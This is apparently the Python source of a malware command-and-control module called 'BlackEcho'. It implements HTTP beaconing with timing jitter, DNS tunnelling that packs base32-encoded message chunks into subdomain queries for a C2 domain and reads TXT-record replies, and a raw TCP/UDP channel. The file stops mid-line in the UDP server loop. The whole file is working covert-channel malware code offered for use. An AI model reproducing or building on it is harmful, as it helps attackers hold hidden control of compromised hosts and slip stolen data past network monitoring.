"""
BlackEcho Channel Manager
Handles multiple communication channels for C2 operations
"""
import logging
import threading
import time
import random
import socket
import ssl
import queue
import json
import os
import base64
import struct
import hashlib
import uuid
import http.server
import socketserver
import urllib.parse
from typing import Dict, List, Any, Optional, Union, Tuple, Callable
import dns.resolver
import dns.message
import dns.name
import dns.rdatatype
import dns.rdataclass
import dns.query


class Channel:
    """Base class for communication channels"""
    
    def __init__(self, name: str, config: Dict[str, Any]):
        """Initialize a communication channel
        
        Args:
            name: Channel name
            config: Channel configuration
        """
        self.name = name
        self.config = config
        self.enabled = config.get("enabled", True)
        self.logger = logging.getLogger(f"BlackEcho.Channel.{name}")
        self.running = False
        self.message_queue = queue.Queue()
        self.response_handlers = {}
    
    def start(self):
        """Start the communication channel"""
        if self.running or not self.enabled:
            return
            
        self.running = True
        self._start_channel()
        self.logger.info(f"Channel {self.name} started")
    
    def stop(self):
        """Stop the communication channel"""
        if not self.running:
            return
            
        self.running = False
        self._stop_channel()
        self.logger.info(f"Channel {self.name} stopped")
    
    def send_message(self, message: Dict[str, Any], handler: Optional[Callable] = None) -> str:
        """Send a message through the channel
        
        Args:
            message: Message to send
            handler: Optional callback for the response
            
        Returns:
            Message ID
        """
        # Generate message ID if not provided
        if "id" not in message:
            message["id"] = str(uuid.uuid4())
            
        # Add timestamp if not provided
        if "timestamp" not in message:
            message["timestamp"] = time.time()
            
        # Store response handler if provided
        if handler:
            self.response_handlers[message["id"]] = handler
            
        # Queue message for sending
        self.message_queue.put(message)
        
        return message["id"]
    
    def handle_response(self, response: Dict[str, Any]):
        """Handle a response to a sent message
        
        Args:
            response: Response data
        """
        # Extract message ID
        msg_id = response.get("id")
        if not msg_id:
            self.logger.warning("Received response without message ID")
            return
            
        # Find and call the handler
        handler = self.response_handlers.pop(msg_id, None)
        if handler:
            try:
                handler(response)
            except Exception as e:
                self.logger.error(f"Error in response handler: {e}")
        else:
            self.logger.debug(f"No handler found for message ID: {msg_id}")
    
    def receive_message(self, callback: Callable):
        """Register a callback for received messages
        
        Args:
            callback: Function to call when a message is received
        """
        self.message_callback = callback
    
    def _start_channel(self):
        """Start channel-specific operations (to be implemented by subclasses)"""
        raise NotImplementedError("Subclasses must implement _start_channel")
    
    def _stop_channel(self):
        """Stop channel-specific operations (to be implemented by subclasses)"""
        raise NotImplementedError("Subclasses must implement _stop_channel")
    
    def _send_implementation(self, message: Dict[str, Any]) -> bool:
        """Send a message (to be implemented by subclasses)
        
        Args:
            message: Message to send
            
        Returns:
            True if successful, False otherwise
        """
        raise NotImplementedError("Subclasses must implement _send_implementation")
    
    def _process_received(self, data: Any):
        """Process received data and call the message callback
        
        Args:
            data: Received data
        """
        if not hasattr(self, 'message_callback'):
            self.logger.warning("Received message but no callback registered")
            return
            
        try:
            # Convert data to a message object
            message = self._parse_received_data(data)
            
            # Call the callback
            self.message_callback(message, self)
        except Exception as e:
            self.logger.error(f"Error processing received data: {e}")
    
    def _parse_received_data(self, data: Any) -> Dict[str, Any]:
        """Parse received data into a message object (to be implemented by subclasses)
        
        Args:
            data: Received data
            
        Returns:
            Parsed message
        """
        raise NotImplementedError("Subclasses must implement _parse_received_data")
    
    def _message_sender_loop(self):
        """Main loop for the message sender thread"""
        while self.running:
            try:
                # Get message from queue with timeout
                try:
                    message = self.message_queue.get(timeout=1.0)
                except queue.Empty:
                    continue
                    
                # Try to send the message
                success = self._send_implementation(message)
                
                if not success:
                    # If sending failed, requeue with a delay
                    self.logger.warning(f"Failed to send message {message.get('id')}, will retry")
                    threading.Timer(5.0, lambda: self.message_queue.put(message)).start()
                    
                self.message_queue.task_done()
                
            except Exception as e:
                self.logger.error(f"Error in message sender: {e}")


class HttpChannel(Channel):
    """HTTP/HTTPS communication channel"""
    
    def __init__(self, name: str, config: Dict[str, Any]):
        """Initialize HTTP channel
        
        Args:
            name: Channel name
            config: Channel configuration
        """
        super().__init__(name, config)
        
        # Extract configuration
        self.base_url = config.get("url", "https://localhost:8443")
        self.verify_ssl = config.get("verify_ssl", True)
        self.timeout = config.get("timeout", 30)
        self.jitter = config.get("jitter", 30)  # Percentage
        self.interval = config.get("interval", 60)  # Seconds
        self.headers = config.get("headers", {})
        self.beaconing = config.get("beaconing", True)
        self.proxy = config.get("proxy", None)
        
        # Import requests within the constructor to allow fallback
        try:
            import requests
            self.requests = requests
        except ImportError:
            self.logger.error("requests module not available, HTTP channel will be disabled")
            self.enabled = False
    
    def _start_channel(self):
        """Start the HTTP channel"""
        if not self.enabled:
            return
            
        # Start message sender thread
        self.sender_thread = threading.Thread(target=self._message_sender_loop)
        self.sender_thread.daemon = True
        self.sender_thread.start()
        
        # Start beaconing thread if enabled
        if self.beaconing:
            self.beacon_thread = threading.Thread(target=self._beacon_loop)
            self.beacon_thread.daemon = True
            self.beacon_thread.start()
    
    def _stop_channel(self):
        """Stop the HTTP channel"""
        # Nothing specific to clean up
        pass
    
    def _send_implementation(self, message: Dict[str, Any]) -> bool:
        """Send a message using HTTP
        
        Args:
            message: Message to send
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Determine endpoint based on message type
            endpoint = message.get("endpoint", "/api/data")
            url = f"{self.base_url}{endpoint}"
            
            # Prepare headers
            headers = self.headers.copy()
            headers["Content-Type"] = "application/json"
            
            # Include authentication if present in config
            if "auth" in self.config:
                auth_type = self.config["auth"].get("type", "none")
                if auth_type == "basic":
                    auth = (
                        self.config["auth"].get("username", ""),
                        self.config["auth"].get("password", "")
                    )
                else:
                    auth = None
            else:
                auth = None
            
            # Create proxy dictionary if configured
            proxies = None
            if self.proxy:
                proxies = {
                    "http": self.proxy,
                    "https": self.proxy
                }
            
            # Send the request
            response = self.requests.post(
                url,
                json=message,
                headers=headers,
                verify=self.verify_ssl,
                timeout=self.timeout,
                auth=auth,
                proxies=proxies
            )
            
            # Check for success
            if response.status_code == 200:
                # Process response
                try:
                    response_data = response.json()
                    self.handle_response(response_data)
                except:
                    self.logger.warning("Failed to parse response JSON")
                
                return True
            else:
                self.logger.error(f"HTTP request failed: {response.status_code} - {response.text}")
                return False
                
        except Exception as e:
            self.logger.error(f"Error sending HTTP message: {e}")
            return False
    
    def _beacon_loop(self):
        """Send periodic beacons to maintain connectivity"""
        while self.running:
            try:
                # Create beacon message
                beacon = {
                    "type": "beacon",
                    "endpoint": "/api/beacon"
                }
                
                # Send beacon
                self.send_message(beacon)
                
                # Sleep with jitter
                base_interval = self.interval
                jitter_amount = base_interval * (self.jitter / 100.0)
                sleep_time = base_interval + random.uniform(-jitter_amount, jitter_amount)
                
                time.sleep(max(1, sleep_time))
                
            except Exception as e:
                self.logger.error(f"Error in beacon loop: {e}")
                time.sleep(60)  # Sleep on error
    
    def _parse_received_data(self, data: Any) -> Dict[str, Any]:
        """Parse received data into a message object
        
        Args:
            data: Received data
            
        Returns:
            Parsed message
        """
        if isinstance(data, bytes):
            data = data.decode('utf-8')
            
        if isinstance(data, str):
            try:
                return json.loads(data)
            except:
                return {"type": "raw", "data": data}
                
        return {"type": "unknown", "data": str(data)}


class DnsChannel(Channel):
    """DNS communication channel"""
    
    def __init__(self, name: str, config: Dict[str, Any]):
        """Initialize DNS channel
        
        Args:
            name: Channel name
            config: Channel configuration
        """
        super().__init__(name, config)
        
        # Extract configuration
        self.domain = config.get("domain", "c2.local")
        self.record_type = config.get("record_type", "TXT")
        self.jitter = config.get("jitter", 20)  # Percentage
        self.interval = config.get("interval", 300)  # Seconds
        self.timeout = config.get("timeout", 30)
        self.max_chunk_size = config.get("max_chunk_size", 200)  # bytes
        self.dns_server = config.get("dns_server", "8.8.8.8")
        self.encoder = base64.b32encode  # Use base32 for DNS-safe encoding
        self.decoder = base64.b32decode
        
        # Check for required DNS module
        if not 'dns' in globals():
            self.logger.error("dnspython module not available, DNS channel will be disabled")
            self.enabled = False
    
    def _start_channel(self):
        """Start the DNS channel"""
        if not self.enabled:
            return
            
        # Start message sender thread
        self.sender_thread = threading.Thread(target=self._message_sender_loop)
        self.sender_thread.daemon = True
        self.sender_thread.start()
        
        # Start beaconing thread
        self.beacon_thread = threading.Thread(target=self._beacon_loop)
        self.beacon_thread.daemon = True
        self.beacon_thread.start()
    
    def _stop_channel(self):
        """Stop the DNS channel"""
        # Nothing specific to clean up
        pass
    
    def _send_implementation(self, message: Dict[str, Any]) -> bool:
        """Send a message using DNS tunneling
        
        Args:
            message: Message to send
            
        Returns:
            True if successful, False otherwise
        """
        try:
            # Convert message to JSON
            json_data = json.dumps(message)
            
            # Convert to bytes
            data = json_data.encode('utf-8')
            
            # Split into chunks if needed
            chunks = []
            for i in range(0, len(data), self.max_chunk_size):
                chunk = data[i:i+self.max_chunk_size]
                chunks.append(chunk)
            
            # Prepare chunk metadata
            total_chunks = len(chunks)
            message_id = message.get("id", str(uuid.uuid4()))
            
            # Send each chunk
            responses = []
            
            for i, chunk in enumerate(chunks):
                # Encode the chunk
                encoded = self.encoder(chunk).decode('ascii')
                
                # Create DNS query
                # Format: <chunk_id>-<chunk_number>-<total_chunks>-<encoded_data>.<message_id>.<domain>
                subdomain = f"{i+1}-{total_chunks}-{encoded}"
                query_name = f"{subdomain}.{message_id}.{self.domain}"
                
                try:
                    # Create DNS message
                    query = dns.message.make_query(
                        query_name,
                        dns.rdatatype.from_text(self.record_type)
                    )
                    
                    # Send query
                    response = dns.query.udp(
                        query,
                        self.dns_server,
                        timeout=self.timeout
                    )
                    
                    responses.append(response)
                    
                except Exception as e:
                    self.logger.error(f"Error sending DNS query {i+1}/{total_chunks}: {e}")
                    return False
            
            # Process responses
            if all(responses):
                # Extract and combine response data
                combined_response = self._combine_dns_responses(responses, message_id)
                if combined_response:
                    self.handle_response(combined_response)
                    return True
                    
            return False
            
        except Exception as e:
            self.logger.error(f"Error sending DNS message: {e}")
            return False
    
    def _combine_dns_responses(self, responses: List[Any], message_id: str) -> Optional[Dict[str, Any]]:
        """Combine multiple DNS responses into a single message
        
        Args:
            responses: List of DNS responses
            message_id: Original message ID
            
        Returns:
            Combined message or None on error
        """
        try:
            # Extract and decode data from each response
            chunks = []
            
            for response in responses:
                for rrset in response.answer:
                    for rr in rrset:
                        if rr.rdtype == dns.rdatatype.from_text(self.record_type):
                            # Extract encoded data from TXT record
                            if self.record_type == "TXT":
                                encoded_data = ''.join(rr.strings).decode('ascii')
                                chunk = self.decoder(encoded_data.encode('ascii'))
                                chunks.append(chunk)
            
            if not chunks:
                return None
                
            # Combine chunks
            combined_data = b''.join(chunks)
            
            # Parse JSON
            response_data = json.loads(combined_data.decode('utf-8'))
            
            # Ensure message ID is included
            if "id" not in response_data:
                response_data["id"] = message_id
                
            return response_data
            
        except Exception as e:
            self.logger.error(f"Error combining DNS responses: {e}")
            return None
    
    def _beacon_loop(self):
        """Send periodic beacons to maintain connectivity"""
        while self.running:
            try:
                # Create beacon message
                beacon = {
                    "type": "beacon",
                    "endpoint": "/api/beacon"
                }
                
                # Send beacon
                self.send_message(beacon)
                
                # Sleep with jitter
                base_interval = self.interval
                jitter_amount = base_interval * (self.jitter / 100.0)
                sleep_time = base_interval + random.uniform(-jitter_amount, jitter_amount)
                
                time.sleep(max(1, sleep_time))
                
            except Exception as e:
                self.logger.error(f"Error in beacon loop: {e}")
                time.sleep(60)  # Sleep on error
    
    def _parse_received_data(self, data: Any) -> Dict[str, Any]:
        """Parse received data into a message object
        
        Args:
            data: Received data
            
        Returns:
            Parsed message
        """
        # In practice, DNS channel typically only sends data, not receives
        # This method would only be used if implementing a DNS server
        if isinstance(data, bytes):
            try:
                decoded = self.decoder(data)
                return json.loads(decoded.decode('utf-8'))
            except:
                return {"type": "raw", "data": str(data)}
                
        return {"type": "unknown", "data": str(data)}


class CustomProtocolChannel(Channel):
    """Custom TCP/UDP protocol channel"""
    
    def __init__(self, name: str, config: Dict[str, Any]):
        """Initialize custom protocol channel
        
        Args:
            name: Channel name
            config: Channel configuration
        """
        super().__init__(name, config)
        
        # Extract configuration
        self.protocol = config.get("protocol", "tcp")  # tcp or udp
        self.host = config.get("host", "0.0.0.0")
        self.port = config.get("port", 8444)
        self.server_mode = config.get("server_mode", False)
        self.encryption = config.get("encryption", "aes")
        self.jitter = config.get("jitter", 25)  # Percentage
        self.interval = config.get("interval", 120)  # Seconds
        self.timeout = config.get("timeout", 30)
        self.socket = None
        self.connections = {}
    
    def _start_channel(self):
        """Start the custom protocol channel"""
        # Start sender thread
        self.sender_thread = threading.Thread(target=self._message_sender_loop)
        self.sender_thread.daemon = True
        self.sender_thread.start()
        
        if self.server_mode:
            # Start server socket
            self.server_thread = threading.Thread(target=self._server_loop)
            self.server_thread.daemon = True
            self.server_thread.start()
        else:
            # Start beacon thread
            self.beacon_thread = threading.Thread(target=self._beacon_loop)
            self.beacon_thread.daemon = True
            self.beacon_thread.start()
    
    def _stop_channel(self):
        """Stop the custom protocol channel"""
        # Close server socket if in server mode
        if self.server_mode and self.socket:
            try:
                self.socket.close()
            except:
                pass
            
        # Close all client connections
        for conn_id, conn in list(self.connections.items()):
            try:
                conn["socket"].close()
            except:
                pass
            
        self.connections.clear()
    
    def _server_loop(self):
        """Main loop for server mode"""
        try:
            # Create server socket
            if self.protocol.lower() == "tcp":
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            else:  # UDP
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                
            # Bind to interface
            self.socket.bind((self.host, self.port))
            
            # Start listening (TCP only)
            if self.protocol.lower() == "tcp":
                self.socket.listen(5)
                
            self.logger.info(f"Custom {self.protocol.upper()} server started on {self.host}:{self.port}")
                
            # Main loop
            if self.protocol.lower() == "tcp":
                # Handle TCP connections
                while self.running:
                    try:
                        client_socket, address = self.socket.accept()
                        
                        self.logger.debug(f"New connection from {address[0]}:{address[1]}")
                        
                        # Set timeout
                        client_socket.settimeout(self.timeout)
                        
                        # Create connection ID
                        conn_id = str(uuid.uuid4())
                        
                        # Store connection
                        self.connections[conn_id] = {
                            "socket": client_socket,
                            "address": address,
                            "created": time.time(),
                            "last_activity": time.time()
                        }
                        
                        # Start handler thread
                        handler = threading.Thread(
                            target=self._handle_tcp_client,
                            args=(conn_id,)
                        )
                        handler.daemon = True
                        handler.start()
                        
                    except Exception as e:
                        if self.running:  # Only log if still running
                            self.logger.error(f"Error accepting connection: {e}")
            else:
                # Handle UDP messages
                while self.running:
                    try:
                        self.socket.settimeout(1.0)  # Short timeout to check running flag
                        data